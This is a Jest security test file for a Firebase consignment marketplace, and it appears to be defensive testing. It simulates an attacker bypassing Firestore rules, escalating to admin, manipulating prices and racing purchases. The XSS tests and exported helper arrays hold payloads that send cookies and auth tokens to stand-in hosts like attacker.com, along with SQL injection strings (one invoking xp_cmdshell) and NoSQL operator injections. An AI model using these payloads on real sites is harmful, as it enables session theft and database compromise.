import { describe, it, expect, beforeEach, afterEach } from '@jest/globals';
import { initializeApp } from 'firebase/app';
import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut } from 'firebase/auth';
import { getFirestore, doc, setDoc, getDoc, updateDoc, deleteDoc, collection, addDoc, query, where, getDocs, orderBy, limit } from 'firebase/firestore';

// Firebase config for testing (using environment variables for security)
const firebaseConfig = {
  apiKey: process.env.VITE_FIREBASE_API_KEY || "test-api-key",
  authDomain: process.env.VITE_FIREBASE_AUTH_DOMAIN || "test-project.firebaseapp.com",
  projectId: process.env.VITE_FIREBASE_PROJECT_ID || "test-project",
  storageBucket: process.env.VITE_FIREBASE_STORAGE_BUCKET || "test-project.appspot.com",
  messagingSenderId: process.env.VITE_FIREBASE_MESSAGING_SENDER_ID || "123456789",
  appId: process.env.VITE_FIREBASE_APP_ID || "test-app-id"
};

// Initialize Firebase for testing
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

describe('🔴 MALICIOUS ATTACK TESTS', () => {
  let regularUserEmail = 'test-victim@example.com';
  let regularUserPassword = 'testpass123';
  let attackerEmail = 'attacker@malicious.com';
  let attackerPassword = 'attackerpass123';
  
  beforeEach(async () => {
    // Create test users
    try {
      await createUserWithEmailAndPassword(auth, regularUserEmail, regularUserPassword);
      await createUserWithEmailAndPassword(auth, attackerEmail, attackerPassword);
    } catch (error) {
      // Users might already exist
    }
  });

  afterEach(async () => {
    await signOut(auth);
  });

  describe('🚨 FIREBASE SECURITY RULE BYPASS ATTEMPTS', () => {
    it('should FAIL: Attacker tries to read other users private data', async () => {
      // Sign in as regular user and create some data
      await signInWithEmailAndPassword(auth, regularUserEmail, regularUserPassword);
      const victimUserId = auth.currentUser?.uid;
      
      // Create private user data
      await setDoc(doc(db, 'users', victimUserId!), {
        email: regularUserEmail,
        personalInfo: {
          ssn: '123-45-6789',
          bankAccount: '9876543210',
          address: '123 Secret St'
        },
        isAdmin: false
      });

      // Switch to attacker account
      await signOut(auth);
      await signInWithEmailAndPassword(auth, attackerEmail, attackerPassword);
      
      // ATTACK: Try to read victim's private data
      try {
        const victimDoc = await getDoc(doc(db, 'users', victimUserId!));
        expect(victimDoc.exists()).toBe(false); // Should be blocked by security rules
      } catch (error) {
        expect(error).toBeDefined(); // Should throw permission error
      }
    });

    it('should FAIL: Attacker tries to modify other users items', async () => {
      // Create item as regular user
      await signInWithEmailAndPassword(auth, regularUserEmail, regularUserPassword);
      const victimUserId = auth.currentUser?.uid;
      
      const itemRef = await addDoc(collection(db, 'items'), {
        title: 'Victim\'s Expensive Watch',
        price: 5000,
        sellerId: victimUserId,
        sellerEmail: regularUserEmail,
        status: 'live'
      });

      // Switch to attacker
      await signOut(auth);
      await signInWithEmailAndPassword(auth, attackerEmail, attackerPassword);
      
      // ATTACK: Try to modify victim's item
      try {
        await updateDoc(doc(db, 'items', itemRef.id), {
          price: 1, // Try to change price to $1
          sellerId: auth.currentUser?.uid, // Try to steal the item
          status: 'sold' // Try to mark as sold
        });
        
        // If we get here, the attack succeeded (BAD!)
        expect(true).toBe(false);
      } catch (error) {
        expect(error).toBeDefined(); // Should be blocked
      }
    });

    it('should FAIL: Non-admin tries to access admin functions', async () => {
      await signInWithEmailAndPassword(auth, attackerEmail, attackerPassword);
      const attackerId = auth.currentUser?.uid;
      
      // ATTACK: Try to create admin user document
      try {
        await setDoc(doc(db, 'users', attackerId!), {
          email: attackerEmail,
          isAdmin: true, // Try to make self admin
          role: 'super_admin'
        });
        
        // ATTACK: Try to access admin collection
        await addDoc(collection(db, 'admin_logs'), {
          action: 'malicious_access',
          userId: attackerId,
          timestamp: new Date()
        });
        
        expect(true).toBe(false); // Should not reach here
      } catch (error) {
        expect(error).toBeDefined();
      }
    });

    it('should FAIL: Bulk data exfiltration attempt', async () => {
      await signInWithEmailAndPassword(auth, attackerEmail, attackerPassword);
      
      // ATTACK: Try to download all items
      try {
        const allItemsQuery = query(collection(db, 'items'), limit(10000));
        const snapshot = await getDocs(allItemsQuery);
        
        // If we can read more than expected, it's a problem
        expect(snapshot.size).toBeLessThan(10); // Should be heavily limited
      } catch (error) {
        expect(error).toBeDefined();
      }
    });
  });

  describe('🚨 XSS ATTACK ATTEMPTS', () => {
    it('should FAIL: Script injection in item title', async () => {
      await signInWithEmailAndPassword(auth, attackerEmail, attackerPassword);
      
      const maliciousTitle = '<script>alert("XSS Attack!"); window.location="http://malicious.com";</script>';
      const maliciousDescription = '<img src="x" onerror="document.cookie=\'stolen=true\'; fetch(\'http://attacker.com/steal\', {method: \'POST\', body: document.cookie})">';
      
      try {
        await addDoc(collection(db, 'items'), {
          title: maliciousTitle,
          description: maliciousDescription,
          price: 100,
          sellerId: auth.currentUser?.uid,
          status: 'pending'
        });
        
        // The data might be stored, but should be sanitized on display
        console.log('⚠️ XSS payload stored - check frontend sanitization');
      } catch (error) {
        console.log('✅ XSS payload blocked at database level');
      }
    });

    it('should FAIL: DOM manipulation through user input', async () => {
      await signInWithEmailAndPassword(auth, attackerEmail, attackerPassword);
      
      const domManipulationPayload = `
        </div><script>
          // Try to steal authentication tokens
          const token = localStorage.getItem('firebase-token');
          fetch('http://attacker.com/steal-token', {
            method: 'POST',
            body: JSON.stringify({token: token, cookies: document.cookie})
          });
          
          // Try to modify DOM
          document.body.innerHTML = '<h1>HACKED!</h1>';
        </script><div>
      `;
      
      try {
        await addDoc(collection(db, 'items'), {
          title: 'Innocent Item',
          description: domManipulationPayload,
          category: '<script>alert("category xss")</script>',
          brand: 'javascript:alert("brand xss")',
          price: 100,
          sellerId: auth.currentUser?.uid
        });
      } catch (error) {
        console.log('✅ DOM manipulation payload blocked');
      }
    });
  });

  describe('🚨 BUSINESS LOGIC EXPLOITS', () => {
    it('should FAIL: Price manipulation attack', async () => {
      await signInWithEmailAndPassword(auth, attackerEmail, attackerPassword);
      
      // ATTACK: Try to create items with manipulated prices
      const priceManipulationAttempts = [
        { price: -1000, reason: 'Negative price' },
        { price: 0, reason: 'Zero price' },
        { price: 999999999, reason: 'Extremely high price' },
        { price: 'DROP TABLE items', reason: 'SQL injection attempt' },
        { price: { $ne: null }, reason: 'NoSQL injection attempt' },
        { originalPrice: 1000, price: 10000, reason: 'Price higher than original' }
      ];
      
      for (const attempt of priceManipulationAttempts) {
        try {
          await addDoc(collection(db, 'items'), {
            title: `Attack Item - ${attempt.reason}`,
            price: attempt.price,
            originalPrice: attempt.originalPrice || attempt.price,
            sellerId: auth.currentUser?.uid,
            status: 'pending'
          });
          
          console.log(`⚠️ Price manipulation succeeded: ${attempt.reason}`);
        } catch (error) {
          console.log(`✅ Price manipulation blocked: ${attempt.reason}`);
        }
      }
    });

    it('should FAIL: Status bypass attack', async () => {
      await signInWithEmailAndPassword(auth, attackerEmail, attackerPassword);
      
      // ATTACK: Try to create items with unauthorized statuses
      const statusBypassAttempts = [
        'live', // Should require approval
        'sold', // Should require purchase process
        'shipped', // Should require admin action
        'admin_only', // Should not exist
        null, // Should have default status
        '', // Should have default status
        'approved' // Might require admin approval
      ];
      
      for (const status of statusBypassAttempts) {
        try {
          await addDoc(collection(db, 'items'), {
            title: `Status Bypass Test - ${status}`,
            price: 100,
            status: status,
            sellerId: auth.currentUser?.uid,
            approvedAt: new Date(), // Try to fake approval
            liveAt: new Date(), // Try to fake live date
            soldAt: new Date(), // Try to fake sold date
            adminApproved: true // Try to fake admin approval
          });
          
          console.log(`⚠️ Status bypass succeeded: ${status}`);
        } catch (error) {
          console.log(`✅ Status bypass blocked: ${status}`);
        }
      }
    });

    it('should FAIL: Inventory manipulation attack', async () => {
      await signInWithEmailAndPassword(auth, attackerEmail, attackerPassword);
      
      // ATTACK: Try to manipulate inventory counts and data
      try {
        await addDoc(collection(db, 'items'), {
          title: 'Inventory Attack Item',
          price: 100,
          sellerId: auth.currentUser?.uid,
          quantity: -5, // Negative quantity
          stockCount: 99999, // Unrealistic stock
          reserved: true, // Try to reserve without permission
          featured: true, // Try to make featured without admin
          priority: 'high', // Try to set priority
          internalNotes: 'This is a test attack', // Try to add internal notes
          adminFlags: ['suspicious', 'review'], // Try to add admin flags
          systemGenerated: true // Try to mark as system generated
        });
        
        console.log('⚠️ Inventory manipulation succeeded');
      } catch (error) {
        console.log('✅ Inventory manipulation blocked');
      }
    });
  });

  describe('🚨 AUTHENTICATION BYPASS ATTEMPTS', () => {
    it('should FAIL: Impersonation attack', async () => {
      // Create victim user first
      await signInWithEmailAndPassword(auth, regularUserEmail, regularUserPassword);
      const victimId = auth.currentUser?.uid;
      
      // Sign out and sign in as attacker
      await signOut(auth);
      await signInWithEmailAndPassword(auth, attackerEmail, attackerPassword);
      
      // ATTACK: Try to impersonate victim
      try {
        await addDoc(collection(db, 'items'), {
          title: 'Impersonation Attack Item',
          price: 1000,
          sellerId: victimId, // Try to use victim's ID
          sellerEmail: regularUserEmail, // Try to use victim's email
          sellerName: 'Victim User', // Try to use victim's name
          status: 'live'
        });
        
        console.log('⚠️ Impersonation attack succeeded');
      } catch (error) {
        console.log('✅ Impersonation attack blocked');
      }
    });

    it('should FAIL: Token manipulation attempt', async () => {
      await signInWithEmailAndPassword(auth, attackerEmail, attackerPassword);
      
      // ATTACK: Try to create items with manipulated auth data
      try {
        await addDoc(collection(db, 'items'), {
          title: 'Token Manipulation Item',
          price: 100,
          sellerId: 'fake-admin-id',
          sellerEmail: 'admin@consignment.com',
          isAdminCreated: true,
          bypassValidation: true,
          status: 'live'
        });
        
        console.log('⚠️ Token manipulation succeeded');
      } catch (error) {
        console.log('✅ Token manipulation blocked');
      }
    });
  });

  describe('🚨 DATA INJECTION ATTACKS', () => {
    it('should FAIL: NoSQL injection attempts', async () => {
      await signInWithEmailAndPassword(auth, attackerEmail, attackerPassword);
      
      const noSQLInjectionPayloads = [
        { $ne: null },
        { $gt: '' },
        { $where: 'this.price < 10' },
        { $regex: '.*' },
        "'; DROP COLLECTION items; --",
        { $or: [{ price: { $lt: 1000 } }, { status: 'live' }] }
      ];
      
      for (const payload of noSQLInjectionPayloads) {
        try {
          await addDoc(collection(db, 'items'), {
            title: 'NoSQL Injection Test',
            price: 100,
            sellerId: auth.currentUser?.uid,
            maliciousField: payload,
            category: payload,
            searchQuery: payload
          });
        } catch (error) {
          console.log('✅ NoSQL injection blocked');
        }
      }
    });

    it('should FAIL: Large payload attack (DoS attempt)', async () => {
      await signInWithEmailAndPassword(auth, attackerEmail, attackerPassword);
      
      // ATTACK: Try to create extremely large documents
      const largeString = 'A'.repeat(1000000); // 1MB string
      const largeArray = new Array(10000).fill('spam');
      
      try {
        await addDoc(collection(db, 'items'), {
          title: 'DoS Attack Item',
          price: 100,
          sellerId: auth.currentUser?.uid,
          largeDescription: largeString,
          spamArray: largeArray,
          nestedObject: {
            level1: { level2: { level3: { level4: { data: largeString } } } }
          }
        });
        
        console.log('⚠️ Large payload attack succeeded');
      } catch (error) {
        console.log('✅ Large payload attack blocked');
      }
    });
  });

  describe('🚨 RACE CONDITION ATTACKS', () => {
    it('should FAIL: Concurrent modification attack', async () => {
      await signInWithEmailAndPassword(auth, attackerEmail, attackerPassword);
      
      // Create an item first
      const itemRef = await addDoc(collection(db, 'items'), {
        title: 'Race Condition Target',
        price: 1000,
        sellerId: auth.currentUser?.uid,
        status: 'live',
        quantity: 1
      });
      
      // ATTACK: Try to purchase the same item multiple times simultaneously
      const purchaseAttempts = Array(10).fill(null).map(async () => {
        try {
          await updateDoc(doc(db, 'items', itemRef.id), {
            status: 'sold',
            buyerId: auth.currentUser?.uid,
            soldAt: new Date(),
            soldPrice: 1000
          });
          return 'success';
        } catch (error) {
          return 'failed';
        }
      });
      
      const results = await Promise.all(purchaseAttempts);
      const successCount = results.filter(r => r === 'success').length;
      
      expect(successCount).toBeLessThanOrEqual(1); // Should only succeed once
    });
  });
});

// Helper function to test XSS payloads in frontend
export const testXSSPayloads = [
  '<script>alert("XSS")</script>',
  '<img src="x" onerror="alert(\'XSS\')">',
  'javascript:alert("XSS")',
  '<svg onload="alert(\'XSS\')">',
  '<iframe src="javascript:alert(\'XSS\')">',
  '"><script>alert("XSS")</script>',
  '\';alert("XSS");//',
  '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>',
  '<script>fetch("http://attacker.com/steal", {method: "POST", body: localStorage.getItem("firebase-token")})</script>'
];

// Helper function to test SQL injection payloads (even though we use Firestore)
export const testSQLInjectionPayloads = [
  "'; DROP TABLE items; --",
  "' OR '1'='1",
  "' UNION SELECT * FROM users --",
  "'; INSERT INTO items VALUES ('hacked'); --",
  "' OR 1=1 --",
  "admin'--",
  "' OR 'x'='x",
  "'; EXEC xp_cmdshell('dir'); --"
];

// Helper function to test business logic bypass payloads
export const testBusinessLogicPayloads = {
  prices: [-1, 0, 999999999, null, undefined, 'free', { $ne: 0 }],
  statuses: ['admin_only', 'system', 'internal', 'bypassed', null, ''],
  userIds: ['admin', 'system', 'root', null, undefined, { $ne: null }],
  booleans: ['true', 'false', 1, 0, null, undefined, { $ne: false }]
}; 